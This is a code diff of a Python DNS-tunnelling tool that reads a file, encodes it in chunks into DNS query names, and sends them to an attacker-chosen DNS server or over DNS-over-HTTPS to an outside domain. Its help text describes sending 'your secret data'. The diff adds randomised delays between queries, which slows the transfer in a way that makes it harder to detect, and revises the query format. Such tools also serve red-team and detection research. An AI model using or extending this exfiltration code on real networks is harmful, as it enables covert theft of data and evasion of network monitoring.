@@ -6,13 +6,13 @@
 
 import base64
 import uuid
-import os
+import os, random
+from xmlrpc.client import boolean
 import dns.message
 import dns.asyncquery
 import dns.asyncresolver
 from dns.exception import Timeout
 import time, argparse
-
 
 
 file_uuid_str = f'{uuid.uuid4()}'
@@ -45,7 +45,7 @@ def send_file_dns_over_udp(filename: str, dns_server: str):
     3. send finish_query query with Z, denoting complete
     """
 
-    setup_query =  f'{file_uuid_str}.A.{num_chunks}.{apex_domain}'
+    setup_query =  f'{file_uuid_str}.A.{num_chunks}.0.{apex_domain}'
     send_plaintext_query(query=setup_query, dns_server=dns_server)
     time.sleep(1)
     counter = 0
@@ -53,8 +53,11 @@ def send_file_dns_over_udp(filename: str, dns_server: str):
         file_chunk_query = f'{file_uuid_str}.D.{counter}.{chunk}.{apex_domain}'
         send_plaintext_query(query=file_chunk_query, dns_server=dns_server)
         counter += 1
+        # if not no_throttle_queries:
+        time.sleep(random.uniform(0.5,1.5))
+        #break   #remove this to send the full file
 
-    finish_query = f'{file_uuid_str}.Z.{counter}.{apex_domain}'
+    finish_query = f'{file_uuid_str}.Z.{counter}.0.{apex_domain}'
     time.sleep(1)
     send_plaintext_query(query=finish_query,dns_server=dns_server)
 
@@ -124,7 +127,7 @@ def send_file_dns_over_https(filename):
     3. send finish_query query with Z, denoting complete
     """
 
-    setup_query =  f'{file_uuid_str}.A.{num_chunks}.docybertoit.com'
+    setup_query =  f'{file_uuid_str}.A.0.{num_chunks}.docybertoit.com'
     send_query_dns_over_https(setup_query)
     time.sleep(1)
     counter = 0
@@ -134,19 +137,21 @@ def send_file_dns_over_https(filename):
         counter += 1
         time.sleep(0.5)
 
-    finish_query = f'{file_uuid_str}.Z.{counter}.docybertoit.com'
+    finish_query = f'{file_uuid_str}.Z.0.{counter}.docybertoit.com'
     time.sleep(1)
     send_query_dns_over_https(finish_query)
 
 if __name__ == "__main__":
-
+    
     ap = argparse.ArgumentParser()
     ap.add_argument('-f', '--filename', dest='file_to_send', type=str, help='The file you want to send using DNS tunneling')
     ap.add_argument('-d', '--dnsip' , dest="dns_server", type=str, help='The DNS server you want to send your secret data to.')
     ap.add_argument('-a', '--apexdomain' , dest="apex", type=str, help='The Apex domain...what you\'re going to use as an authoritatvie dns server.')
+
     args = vars(ap.parse_args())
     print(args)
-    global apex_domain
+    
     apex_domain = args['apex']
+    # no_throttle_queries = args['query_throttling']
 
     send_file_dns_over_udp(filename=args['file_to_send'], dns_server=args['dns_server'])
